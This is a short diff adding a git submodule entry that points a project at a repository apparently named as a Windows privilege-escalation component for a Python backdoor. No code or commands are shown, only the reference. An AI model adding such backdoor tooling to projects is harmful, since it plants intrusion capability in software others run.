@@ -1,0 +1,3 @@
+[submodule "src/submodule/WinPwnage"]
+	path = src/submodule/WinPwnage
+	url = https://github.com/xp4xbox/WinPwnage-Python-Backdoor-Submodule
